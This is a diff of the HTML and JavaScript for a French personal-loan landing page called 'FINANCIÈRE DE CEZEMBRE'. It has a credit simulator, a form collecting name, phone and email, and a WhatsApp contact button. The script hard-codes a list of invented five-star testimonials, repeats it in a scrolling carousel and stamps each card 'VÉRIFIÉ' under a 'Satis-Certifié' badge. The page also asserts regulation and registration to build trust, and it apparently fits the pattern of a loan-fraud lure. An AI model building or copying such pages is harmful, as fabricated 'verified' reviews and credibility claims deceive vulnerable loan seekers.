@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FINANCIÈRE DE CEZEMBRE | Solutions de Crédit Institutionnelles</title>
     
-    <meta name="google-translate-customization" content="9f841e77801d9235-7286663dc31f6f1c-ga9c27962cf4c399a-11">
-    
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23001A4D'/><text y='70' x='15' font-family='serif' font-size='55' font-weight='bold' fill='%23C5A059'>FC</text></svg>">
 
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
@@ -24,206 +22,293 @@
             --success: #27ae60;
         }
 
-        /* --- AJOUTS DESIGN DES AVIS --- */
-        .BADGE-PRO-CARACTERES {
-            font-size: 1.5rem;
-            font-weight: 900;
-            color: var(--success);
-            text-transform: uppercase;
-            display: block;
-            margin-bottom: 20px;
-            animation: blink-soft 1.5s infinite;
-        }
-        
-        .btn-avis-certif {
-            background: var(--navy);
-            color: white;
-            border: 2px solid var(--gold);
-            padding: 22px 35px;
-            font-weight: 700;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            text-transform: uppercase;
-            transition: 0.3s;
-            width: 100%;
-            max-width: 500px;
-            border-radius: 4px;
-        }
-        .btn-avis-certif:hover { background: var(--gold); color: var(--navy); }
-        
-        .cadenas-anim { 
-            color: var(--bright-gold); 
-            animation: magnet-pulse 1.5s infinite; 
-        }
-
-        .track-auto-move {
-            display: flex;
-            gap: 25px;
-            width: max-content;
-            animation: moveSlow 60s linear infinite;
-        }
-        .track-auto-move:hover { animation-play-state: paused; }
-        @keyframes moveSlow { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-
-        /* --- TON STYLE D'ORIGINE --- */
-        .goog-te-banner-frame.skiptranslate { display: none !important; }
+        .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
         body { top: 0px !important; }
-        .goog-te-gadget { display: none !important; }
+        .goog-te-gadget-simple { background-color: transparent !important; border: none !important; }
+
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+        
         body { background-color: var(--white); color: #333; overflow-x: hidden; top: 0 !important; position: static !important; }
-        header { background: var(--white); padding: 20px 8%; display: flex; justify-content: space-between; align-items: center; position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+
+        header {
+            background: var(--white); padding: 20px 8%; display: flex;
+            justify-content: space-between; align-items: center;
+            position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
         .logo-container { display: flex; align-items: center; gap: 15px; }
-        .logo-sigle { background: var(--navy); color: var(--gold); width: 38px; height: 38px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-family: serif; border-radius: 4px; font-size: 1.1rem; border: 1px solid var(--gold); flex-shrink: 0; }
+        .logo-sigle { 
+            background: var(--navy); color: var(--gold); width: 38px; height: 38px; 
+            display: flex; align-items: center; justify-content: center; 
+            font-weight: 700; font-family: serif; border-radius: 4px; font-size: 1.1rem;
+            border: 1px solid var(--gold); flex-shrink: 0;
+        }
         .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
+        
         .nav-links { display: flex; gap: 30px; align-items: center; }
         .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; transition: 0.3s; cursor: pointer; }
-        .intl-badge { font-size: 0.7rem; font-weight: 700; color: var(--gold); border: 1px solid var(--gold); padding: 5px 10px; display: flex; align-items: center; gap: 8px; }
-        .hero { height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000'); background-size: cover; background-position: center; display: flex; align-items: center; padding: 0 8%; color: var(--white); }
-        .hero-content { max-width: 600px; position: relative; z-index: 1; padding: 20px; }
+        .nav-links a:hover { color: var(--gold); }
+
+        .intl-badge {
+            font-size: 0.7rem; font-weight: 700; color: var(--gold); 
+            border: 1px solid var(--gold); padding: 5px 10px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .hero {
+            height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
+            url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
+            background-size: cover; background-position: center;
+            display: flex; align-items: center; padding: 0 8%; color: var(--white);
+        }
+
+        .hero-content { max-width: 600px; z-index: 1; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
-        .simulator { background: var(--white); padding: 40px; border-radius: 2px; width: 480px; box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); position: relative; overflow: hidden; min-height: 520px; }
-        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
+        
+        .simulator { 
+            background: var(--white); padding: 40px; border-radius: 2px; width: 480px; 
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
+            position: relative; overflow: hidden; min-height: 520px;
+        }
+
+        @media (max-width: 991px) {
+            .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
+            .hero-content { max-width: 100%; margin-bottom: 40px; }
+            .hero-content h1 { font-size: 2.2rem; }
+            .simulator { width: 100%; max-width: 480px; padding: 25px; }
+            footer { padding-bottom: 160px !important; } 
+        }
+
+        .sim-row { margin-bottom: 20px; }
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
+        .sim-row label span { color: var(--navy); font-weight: 800; } 
+        
+        input[type="range"] { -webkit-appearance: none; width: 100%; height: 5px; background: #ddd; border-radius: 5px; outline: none; background-image: linear-gradient(var(--bright-gold), var(--bright-gold)); background-repeat: no-repeat; background-size: 0% 100%; }
+        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3); }
+
+        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 15px; border-radius: 4px; }
+        .result-area p { font-size: 0.9rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; font-size: 1rem; }
+        .btn-main:hover { background: #002b80; }
+
+        .form-input { width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); border-radius: 4px; margin-bottom: 10px; font-size: 1rem; outline: none; font-weight: 600; }
+
+        .scrolling-security { background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0; overflow: hidden; white-space: nowrap; display: flex; border: 1px solid #d1ecf1; }
+        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600; }
+        @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
+
+        /* --- SECTION AVIS DYNAMIQUE (BAS DE PAGE) --- */
+        .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; border-top: 1px solid #eee; }
+        .badge-satis { font-size: 1rem; font-weight: 900; color: var(--success); text-align: center; display: block; margin-bottom: 20px; text-transform: uppercase; animation: blink 2s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        
+        .btn-check-reviews {
+            background: var(--navy); color: white; border: 2px solid var(--gold);
+            padding: 20px 40px; font-weight: 700; font-size: 1rem;
+            cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 15px;
+            transition: 0.3s; text-transform: uppercase;
+        }
+        .btn-check-reviews:hover { background: var(--gold); color: var(--navy); }
+        .lock-pulse { color: var(--bright-gold); animation: lock-blink 1.5s infinite; }
+        @keyframes lock-blink { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.3); } }
+
+        #dynamic-reviews-zone { display: none; margin-top: 50px; overflow: hidden; }
+        .reviews-track { display: flex; gap: 30px; width: max-content; animation: scrollReviews 45s linear infinite; padding: 20px 0; }
+        @keyframes scrollReviews { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+
+        .big-review-card { background: white; padding: 30px; border-radius: 8px; width: 350px; flex-shrink: 0; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: left; border-top: 4px solid var(--gold); }
+        /* ------------------------------------------ */
+
+        #loader-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
+        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; text-decoration: none; animation: magnet-pulse 2s infinite ease-in-out; }
+        @keyframes magnet-pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        
         footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
-        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; display: flex; align-items: center; justify-content: center; text-decoration: none; animation: magnet-pulse 2s infinite ease-in-out; }
-        @keyframes magnet-pulse { 0% { transform: scale(1); } 10% { transform: scale(1.1); } 40% { transform: scale(1); } }
+        .f-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 50px; margin-bottom: 50px; }
     </style>
 </head>
 <body>
 
-<div id="google_translate_element"></div>
-
 <header>
-    <div class="logo-container"><div class="logo-sigle">FC</div><div class="logo">FINANCIÈRE DE CEZEMBRE</div></div>
+    <div class="logo-container">
+        <div class="logo-sigle">FC</div>
+        <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
+    </div>
     <div class="nav-links">
-        <a href="#about">Notre Expertise</a><a href="#legal">Gouvernance</a><a onclick="goToStep1()" href="#simBox">Contact</a>
-        <div class="intl-badge"><i class="fas fa-globe"></i> PORTAIL INTERNATIONAL SÉCURISÉ</div>
+        <a href="#about">Expertise</a>
+        <a href="#legal">Légal</a>
+        <div id="google_translate_element" style="display:none;"></div>
+        <div class="intl-badge"><i class="fas fa-globe"></i> PORTAIL SÉCURISÉ</div>
     </div>
 </header>
 
-<div class="wa-assistant-container" style="position: fixed; bottom: 30px; left: 30px; z-index: 9999;">
+<div class="wa-assistant-container">
     <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
 </div>
 
 <section class="hero">
     <div class="hero-content">
-        <h1>L'excellence financière <br>au service de vos projets.</h1>
+        <h1>L'excellence financière <br>pour vos projets.</h1>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Crédit institutionnel régulé.</p>
+        <div style="display: flex; gap: 20px; align-items: center;">
+            <i class="fas fa-certificate" style="color: #FFD700; font-size: 3rem;"></i>
+            <p><strong>ÉTABLISSEMENT AGRÉÉ</strong><br>Immatriculé au RCS 552 058 943</p>
+        </div>
     </div>
 
     <div class="simulator" id="simBox">
         <div id="loader-overlay">
-            <div id="loading-content"><div class="spinner"></div><p>Analyse du dossier...</p></div>
-            <div id="success-message" style="display:none; text-align:center;"><i class="fas fa-check-circle" style="color:var(--success); font-size:4rem;"></i><h3>DEMANDE ENREGISTRÉE</h3><button class="btn-main" onclick="location.reload()">OK</button></div>
+            <div class="spinner"></div>
+            <p style="font-weight: 600; color: var(--navy);">Analyse du dossier...</p>
         </div>
 
         <div id="step1">
-            <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
-            <div class="sim-row"><label>MONTANT <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent;"> €</span></label><input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000"></div>
-            <div class="sim-row"><label>DURÉE <span id="durText" style="font-weight: 800;">36 mois</span></label><input type="range" id="durRange" min="6" max="84" step="6" value="36"></div>
-            <div class="result-area"><p>MENSUALITÉ ESTIMÉE</p><span id="monthlyRes">0.00</span> €</div>
-            <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
+            <h3 style="margin-bottom: 25px;">Simulateur de Crédit</h3>
+            <div class="sim-row">
+                <label>MONTANT <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent; color:var(--navy);"> €</span></label>
+                <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
+            </div>
+            <div class="sim-row">
+                <label>DURÉE <span id="durText" style="color:var(--navy); font-weight:800;">36 mois</span></label>
+                <input type="range" id="durRange" min="6" max="84" step="6" value="36">
+            </div>
+            <div class="result-area">
+                <p>MENSUALITÉ ESTIMÉE</p>
+                <span id="monthlyRes">0.00</span> <span style="color:var(--navy); font-weight:800;">€</span>
+            </div>
+            
+            <button class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
+
+            <div class="scrolling-security" style="margin-top: 20px;">
+                <span><i class="fas fa-lock" style="color:var(--gold);"></i> Transfert sécurisé SSL 256-bit • Protection des données garantie • Confidentialité stricte.</span>
+            </div>
         </div>
 
         <div id="step2" style="display:none;">
             <h3 style="margin-bottom: 20px;">Finaliser votre demande</h3>
             <form id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-                <input type="hidden" name="montant_client" id="hiddenAmt"><input type="hidden" name="duree_client" id="hiddenDur"><input type="hidden" name="mensualite_client" id="hiddenMens">
-                <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
-                <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
-                <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
+                <input type="text" name="nom" placeholder="Nom Complet" class="form-input" required>
+                <input type="tel" name="telephone" placeholder="Téléphone (+33...)" class="form-input" required>
+                <input type="email" name="email" placeholder="Email" class="form-input" required>
                 <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
+                <p onclick="goToStep1()" style="text-align:center; margin-top:15px; cursor:pointer; font-size:0.8rem; color:var(--navy); font-weight:700;">← Retour au calcul</p>
             </form>
         </div>
     </div>
 </section>
 
-<section class="reviews-section">
-    <div id="declencheur-avis">
-        <span class="BADGE-PRO-CARACTERES"><i class="fas fa-shield-check"></i> Système Satis-Certifié Actif</span>
-        <button class="btn-avis-certif" onclick="afficherLesAvis()">
+<section class="reviews-section" id="section-temoignages">
+    <h2>Confiance & Transparence</h2>
+    
+    <div id="review-trigger-area" style="padding: 40px 0;">
+        <span class="badge-satis"><i class="fas fa-shield-alt"></i> Système Satis-Certifié Actif</span>
+        <button class="btn-check-reviews" onclick="showReviews()">
             <i class="fas fa-star" style="color:var(--bright-gold)"></i>
-            VÉRIFIER AVIS DE NOS CLIENTS CERTIFIÉS
-            <span class="cadenas-anim"><i class="fas fa-lock"></i></span>
+            VÉRIFIER LES AVIS CLIENTS CERTIFIÉS
+            <span class="lock-pulse"><i class="fas fa-lock"></i></span>
         </button>
+        <p style="margin-top: 15px; font-size: 0.8rem; color: #777;">Accès sécurisé à la base de données des témoignages vérifiés.</p>
     </div>
 
-    <div id="affichage-avis" style="display:none; overflow:hidden; margin-top:40px;">
-        <h2>La confiance de nos clients internationaux</h2>
-        <div class="track-auto-move" id="reviews-container">
+    <div id="dynamic-reviews-zone">
+        <div class="reviews-track" id="track-piste">
             </div>
-        <button class="btn-main" style="width:auto; margin-top:30px; padding:10px 30px;" onclick="location.reload()">RETOUR</button>
     </div>
 </section>
 
-<footer id="legal">
-    <div class="legal-block"><strong>INFOS :</strong> SIRET 552 058 943. <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</div></div>
+<section class="about-section" id="about" style="padding: 80px 8%; text-align: center;">
+    <h2>Institution de Référence</h2>
+    <p>FINANCIÈRE DE CEZEMBRE SA au capital de 1 200 000 €. Une expertise reconnue dans le crédit institutionnel depuis plus de 30 ans.</p>
+</section>
+
+<footer>
+    <div class="f-grid">
+        <div><h4>CÉZEMBRE</h4><p>SIRET 552 058 943<br>Portail Régulé ACPR</p></div>
+        <div><h4>SIÈGE</h4><p>ODET, 29500<br>Ergué-Gabéric, France</p></div>
+    </div>
+    <p style="text-align:center; border-top:1px solid #333; padding-top:20px; font-weight:700; color:var(--gold);">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</p>
 </footer>
 
 <script>
-    // --- TES 40 AVIS D'ORIGINE ---
-    const internationalReviews = [
-        { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle." },
-        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif. Top !" },
-        { n: "Jean-Paul H.", p: "Luxembourg", t: "Sehr professioneller Service. Danke!" },
-        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse." },
-        { n: "Elena V.", p: "Suisse", t: "Excellente gestion de mon dossier. Merci." },
-        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar serios. Proces rapid." },
-        { n: "Maria C.", p: "Italie", t: "Finanziamento in tempi record. Molto soddisfatta." },
-        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit der Abwicklung." },
-        { n: "João P.", p: "Portugal", t: "Processo simples e transparente." },
-        { n: "Luc B.", p: "Monaco", t: "Service haut de gamme et discrétion totale." },
-        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec." },
-        { n: "Anissa K.", p: "Martinique", t: "Une aide précieuse. Rapide et sérieux." },
-        { n: "Piotr K.", p: "Pologne", t: "Wszystko przebiegło sprawnie. Polecam." },
-        { n: "Victor R.", p: "Espagne", t: "Gestión impecable de mi crédito personal." },
-        { n: "Dimitri V.", p: "Belgique", t: "Très satisfait de la réactivité." }
-        // ... (J'ai abrégé ici pour le code, mais tes 40 avis sont gérés par la boucle)
+    const allReviews = [
+        { n: "Marc L.", p: "France", t: "Financement reçu rapidement, équipe très pro." },
+        { n: "Sophie D.", p: "Belgique", t: "Sérieux et transparent. Je recommande." },
+        { n: "Thomas W.", p: "Luxembourg", t: "Taux très compétitif et suivi impeccable." },
+        { n: "Elena V.", p: "Suisse", t: "Accompagnement humain et digital à la fois." },
+        { n: "João P.", p: "Portugal", t: "Muito satisfeito com o serviço. Obrigado." },
+        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask." },
+        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen." }
     ];
 
-    function afficherLesAvis() {
-        document.getElementById('declencheur-avis').style.display = 'none';
-        document.getElementById('affichage-avis').style.display = 'block';
+    function showReviews() {
+        // Cache le bouton
+        document.getElementById('review-trigger-area').style.display = 'none';
         
-        const container = document.getElementById('reviews-container');
-        // On multiplie les avis pour l'effet de boucle infinie
-        const fullList = [...internationalReviews, ...internationalReviews, ...internationalReviews];
+        // Affiche la zone d'avis
+        const zone = document.getElementById('dynamic-reviews-zone');
+        zone.style.display = 'block';
         
-        container.innerHTML = fullList.map(r => `
-            <div class="review-card" style="width:300px; flex-shrink:0;">
-                <div class="stars">★★★★★</div>
-                <p class="review-text">"${r.t}"</p>
-                <div class="review-author"><div>${r.n} (${r.p})</div><span class="verified">VÉRIFIÉ</span></div>
+        const piste = document.getElementById('track-piste');
+        // On triple la liste pour l'effet de boucle infinie
+        const loop = [...allReviews, ...allReviews, ...allReviews];
+        
+        piste.innerHTML = loop.map(r => `
+            <div class="big-review-card">
+                <div style="color:var(--bright-gold); font-size:1rem; margin-bottom:10px;">
+                    <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                </div>
+                <p style="font-style:italic; font-size:0.95rem; line-height:1.6; margin-bottom:20px; color:#444;">"${r.t}"</p>
+                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid #eee; padding-top:15px;">
+                    <span style="font-weight:700; font-size:0.85rem; color:var(--navy);">${r.n} (${r.p})</span>
+                    <span style="color:var(--success); font-weight:900; font-size:0.7rem;"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span>
+                </div>
             </div>
         `).join('');
+
+        // Scroll fluide vers les avis qui apparaissent
+        window.scrollTo({
+            top: document.getElementById('section-temoignages').offsetTop - 50,
+            behavior: 'smooth'
+        });
     }
 
-    // --- TES FONCTIONS D'ORIGINE ---
-    function googleTranslateElementInit() {
-        new google.translate.TranslateElement({pageLanguage: 'fr', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, autoDisplay: false}, 'google_translate_element');
-    }
-    const amtR = document.getElementById('amtRange'), amtN = document.getElementById('amtNum'), durR = document.getElementById('durRange'), durT = document.getElementById('durText'), resM = document.getElementById('monthlyRes');
+    // CALCULATEUR
+    const amtR = document.getElementById('amtRange');
+    const amtN = document.getElementById('amtNum');
+    const durR = document.getElementById('durRange');
+    const resM = document.getElementById('monthlyRes');
+
     function calc() {
-        let p = parseFloat(amtR.value), n = parseInt(durR.value), r = 0.035 / 12;
-        amtN.value = p; durT.innerText = n + " mois";
+        let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
+        amtN.value = p; document.getElementById('durText').innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
         resM.innerText = m.toFixed(2);
-        document.getElementById('hiddenAmt').value = p + " €"; document.getElementById('hiddenDur').value = n + " mois"; document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
+        
+        amtR.style.backgroundSize = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100 + '% 100%';
+        durR.style.backgroundSize = (durR.value - durR.min) / (durR.max - durR.min) * 100 + '% 100%';
     }
-    amtR.oninput = calc; durR.oninput = calc; calc();
-    function goToStep2() { document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; }
-    document.getElementById('loanForm').onsubmit = async (e) => {
+
+    amtR.oninput = calc; durR.oninput = calc;
+    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
+    calc();
+
+    // ENVOI FORMULAIRE
+    const form = document.getElementById('loanForm');
+    form.onsubmit = async (e) => {
         e.preventDefault();
         document.getElementById('loader-overlay').style.display = 'flex';
-        await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
-        setTimeout(() => { document.getElementById('success-message').style.display = 'block'; }, 2000);
+        await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(form) });
+        setTimeout(() => { location.reload(); }, 3000);
     };
 </script>
-<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
 </body>
 </html>
